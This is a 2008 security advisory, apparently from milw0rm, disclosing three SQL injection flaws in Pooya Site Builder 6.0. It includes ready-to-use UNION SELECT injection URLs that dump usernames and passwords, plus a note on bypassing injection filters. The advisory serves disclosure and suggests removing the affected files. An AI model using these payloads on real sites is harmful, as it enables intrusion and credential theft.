@@ -1,0 +1,67 @@
+########################## www.BugReport.ir #######################################
+#
+#        AmnPardaz Security Research Team
+#
+# Title: Pooya Site Builder (PSB) SQL Injection Vulnerabilities
+# Vendor: www.paridel.com
+# Vulnerable Version: 6.0 (Assembly Version)
+# Exploit: Available
+# Impact: High
+# Fix: N/A
+# Original Advisory: www.bugreport.ir/?/42
+###################################################################################
+
+####################
+1. Description:
+####################
+    Pooya site builder (psb) is an easy to use database driven web content management and security management system. It allows you to create, edit & web content instantly using just a browser, psb provides all essential feature you need for running your own business websites (you can even use it for large websites, without the complexity of unused functions).
+
+####################
+2. Vulnerabilities:
+####################
+    2.1. Injection Flaws. SQL Injection in "/utils/getXsl.aspx" in "xslIdn" parameter.
+        2.1.1. Exploit:
+                        Check the exploit section.
+    2.2. Injection Flaws. SQL Injection in "/utils/getXml.aspx" in "part" parameter.
+        2.2.1. Exploit:
+                        Check the exploit section.
+    2.3. Injection Flaws. SQL Injection in "/utils/getXls.aspx" in "part" parameter.
+        2.3.1. Exploit:
+                        Check the exploit section.
+
+####################
+3. Exploits:
+####################
+    Original Exploit URL: http://bugreport.ir/index.php?/42/exploit
+
+    Use Internet Explorer (IE) for best result.
+    Note: "'" used to bypass any SQL Injection denier.
+    3.1. SQL Injection in "/utils/getXsl.aspx" in "xslIdn" parameter.
+            -------------
+            http://[URL]/utils/getXsl.aspx?xslIdn=-1' union' all' select 'UsrNam%2bUsrPwd' from' [Usr]
+            Open downloaded file by notepad.
+            -------------
+    3.2. SQL Injection in "/utils/getXml.aspx" in "part" parameter.
+            -------------
+            http://[URL]/utils/getXml.aspx?lnkIdn=-1&part=1 from' 'lnk' 'where' 1='2187 'union' all' 'select' 'UsrNam%2bUsrPwd' from' [Usr]' 'union' all' select' data1'
+            Open downloaded file by notepad.
+            -------------
+    3.3. SQL Injection in "/utils/getXls.aspx" in "part" parameter.
+            -------------
+            /utils/getXls.aspx?lnkIdn=-1&part=1 'from 'lnk' 'where' 1='2187 'union' all' 'select' 'CHAR(60)%2bCHAR(116)%2bCHAR(97)%2bCHAR(98)%2bCHAR(108)%2bCHAR(101)%2bCHAR(62)%2bCHAR(60)%2bCHAR(116)%2bCHAR(114)%2bCHAR(62)%2b CHAR(60)%2bCHAR(116)%2bCHAR(100)%2bCHAR(62)%2bUsrNam%2bUsrPwd%2bCHAR(60)%2bCHAR(47)%2bCHAR(116)%2bCHAR(100)%2bCHAR(62)%2b CHAR(60)%2bCHAR(47)%2bCHAR(116)%2bCHAR(114)%2bCHAR(62)%2bCHAR(60)%2bCHAR(47)%2bCHAR(116)%2bCHAR(97)%2bCHAR(98)%2bCHAR(108)%2bCHAR(101)%2bCHAR(62) 'from '[Usr] 'union 'all 'select' data1'
+            Open downloaded file by notepad.
+            -------------
+
+####################
+4. Solution:
+####################
+    Rename or remove "/utils/getXsl.aspx", "/utils/getXml.aspx", and "/utils/getXls.aspx" files and wait for vendor patch.
+####################
+5. Credit:
+####################
+AmnPardaz Security Research & Penetration Testing Group
+Contact: admin[4t}bugreport{d0t]ir
+WwW.BugReport.ir
+WwW.AmnPardaz.com
+
+# milw0rm.com [2008-06-11]
